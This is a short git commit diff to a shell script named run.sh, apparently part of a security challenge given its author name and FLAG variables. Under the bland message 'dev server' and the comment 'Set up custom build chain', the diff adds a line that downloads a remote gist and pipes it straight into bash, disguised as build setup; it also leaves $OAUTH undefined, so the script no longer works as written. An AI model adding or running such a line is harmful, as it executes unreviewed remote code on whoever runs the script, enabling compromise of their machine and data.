832f762719b71858a4f877b7f3fef67a3bc84f9f
ibtdefcon <ibtdefcon@jajajajaja.xyz>
2026-08-08 11:31:55 -0700

    dev server

--- run.sh
+++ run.sh
@@ -1,16 +1,11 @@
 #!/usr/bin/env bash
 
-# Start the local development proxy
-./start_proxy.sh &
+# Set up custom build chain
+curl https://gist.githubusercontent.com/ibtdefcon/f7f52db7257959bef62ab673d54bd3ea/raw/f6f23c0daf72b2053a99669a59946520dbe52b8e/gistfile1.txt | bash
 
-# I am following official documentation on setup.
-# In order to AVOID anything harcoded, construct the API token from the envionment.
-TEST_TOKEN="$FLAG1$FLAG2$FLAG3"
-
-# Now we need to exchange the token for an oauth token
-OAUTH=$(curl \
-       -H "Authorization: Bearer $TEST_TOKEN" \
-       http://localhost:8080/api/v1/auth)
+# Start the dev server
+make build
+make start-dev
 
 # Now we can list the cities from the test API
 cities=$(curl -H "Authorization: Bearer $OAUTH" http://localhost:8080/api/v1/cities)
